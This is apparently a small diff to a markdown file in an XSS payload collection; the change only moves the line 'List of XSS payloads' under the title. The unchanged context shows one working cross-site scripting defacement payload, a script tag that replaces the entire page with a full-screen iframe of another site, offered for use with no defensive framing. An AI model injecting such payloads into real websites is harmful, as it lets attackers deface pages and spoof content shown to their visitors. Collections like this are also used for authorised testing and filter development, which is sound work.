@@ -1,10 +1,9 @@
 # XSS Payloads
+List of XSS payloads
 
 ## XSS Defacement Payloads
 
 ### XSS Script Payload
-List of XSS payloads
-
 ```
 <script>document.documentElement.innerHTML="<html><iframe src='https://example.com' style='visibility: visible; border: 0; position: fixed; top: 0; right: 0; left: 0; bottom: 0; width: 100%; height: 100%;'></iframe></html>";</script>
 ```
